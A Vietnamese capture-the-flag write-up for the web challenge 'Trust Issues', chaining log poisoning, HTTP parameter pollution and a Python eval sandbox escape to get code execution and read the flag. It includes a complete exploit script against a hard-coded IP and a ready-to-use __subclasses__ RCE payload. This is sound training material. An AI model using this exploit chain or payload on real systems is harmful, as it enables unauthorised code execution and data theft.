# Trust Issues Writeup

## Thông tin bài
- **Tên bài**: Trust Issues
- **Mô tả**: "Can you make the system trust you so you can maintain control? Create something special."
- **Nền tảng**: Web Exploitation

## Phân tích

### 1. Cơ chế xác thực (Log Poisoning)
Ứng dụng sử dụng một file log (`log_file.txt`) để xác định người dùng đang đăng nhập.

Trong `function_log.py`:
```python
def get_login_user():
    try:
        with open("log_file.txt", "r", encoding="utf-8") as f:
            for line in reversed(f.readlines()): 
                line = line.strip()
                if line.startswith("user="):
                    # ... trả về username
```

Tại `app.py`, `flask_cors` được cấu hình để log ở level DEBUG:
```python
logging.getLogger('flask_cors').level = logging.DEBUG
# ...
root_logger.setLevel(logging.DEBUG)
```

Flask-CORS sẽ log thông tin chi tiết về request, bao gồm cả path và headers. Điều này tạo cơ hội cho lỗ hổng **Log Poisoning**. Chúng ta có thể chèn ký tự xuống dòng (`\n` hoặc `%0a` trên URL) vào đường dẫn request để ghi thêm một dòng mới vào file log.

Ví dụ: Request tới `/%0auser=admin` sẽ ghi vào log:
```
INFO:flask_cors.core:Request to '/
user=admin' matches CORS resource...
```
Hàm `get_login_user` đọc ngược từ dưới lên, gặp dòng `user=admin` sẽ hiểu là admin đang đăng nhập.

### 2. HTTP Parameter Pollution (HPP)
Endpoint `/calc` chỉ cho phép admin truy cập và thực hiện tính toán. Nó có cơ chế filter input:

```python
text = request.args.get('text')
allowed_chars = "0123456789+-*/"
if not all(char in allowed_chars for char in text):
    return 'Do not cheat hack!!!', 503
```

Tuy nhiên, khi gửi request tới service PHP nội bộ, nó dùng `request.query_string.decode()`:
```python
response = requests.get(
    url=f'http://php_app:5000/?{request.query_string.decode()}',
    timeout=10
)
return str(eval(response.text, {'__builtins__': {}}))
```

Service PHP (`index.php`) chỉ đơn giản echo lại tham số `text`:
```php
$data = $_GET['text'] ?? "Error...";
echo $data;
```

**Lỗ hổng:**
Python `request.args.get('text')` sẽ lấy giá trị **đầu tiên** của tham số `text`.
PHP `$_GET['text']` sẽ lấy giá trị **cuối cùng** của tham số `text`.

Nếu ta gửi `?text=1&text=PAYLOAD`:
1. Python check `text` đầu tiên là "1" -> Thỏa mãn whitelist số.
2. Gửi toàn bộ query string sang PHP.
3. PHP lấy `text` cuối cùng là "PAYLOAD" và trả về.
4. Python `eval("PAYLOAD")`.

### 3. Python Sandbox Escape
Hàm `eval` chạy với `__builtins__` rỗng: `{'__builtins__': {}}`.
Để thực thi lệnh hệ thống (RCE), ta cần thoát khỏi sandbox này bằng cách duyệt qua các class cơ bản của Python để tìm cách import module `os`.

Payload tiêu chuẩn:
```python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('cat flag.txt').read()
```

## Khai thác

### Bước 1: Leo thang lên Admin
Gửi request với URL chứa ký tự xuống dòng và `user=admin` để "đầu độc" file log.
URL: `http://host:port/hack%0auser=admin%0ahack`

### Bước 2: RCE lấy Flag
Sử dụng HPP để bypass whitelist và thực thi payload sandbox escape thông qua tham số thứ 2.

### Script Khai thác (Full)

```python
import requests
import time

BASE_URL = "http://124.197.22.141:8000"

def get_flag():
    # 1. Trở thành Admin bằng Log Poisoning
    # Chèn %0auser=admin vào URL path
    print(f"[*] Poisoning log để leo thang admin...")
    poison_url = f"{BASE_URL}/hack%0auser=admin%0ahack"
    requests.get(poison_url)
    
    # Đợi log được ghi
    time.sleep(1)

    # 2. Bypass Whitelist bằng HPP & Sandbox Escape
    print(f"[*] Đang khai thác RCE...")
    
    # Payload RCE Python
    cmd = "cat flag.txt"
    rce_payload = f"[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('{cmd}').read()"
    
    # Param 1: Hợp lệ (để qua mặt Python check)
    # Param 2: Payload (để PHP trả về cho Python eval)
    params = [
        ('text', '1'), 
        ('text', rce_payload)
    ]
    
    r = requests.get(f"{BASE_URL}/calc", params=params)
    
    if "VSL{" in r.text:
        print("[+] Flag Found!")
        print(r.text)
    else:
        print("[-] Failed.")
        print(r.text)

if __name__ == "__main__":
    get_flag()
```

## Flag
```
VSL{l4g_injection_via_hpp_8080_h3ke4_2026}
```
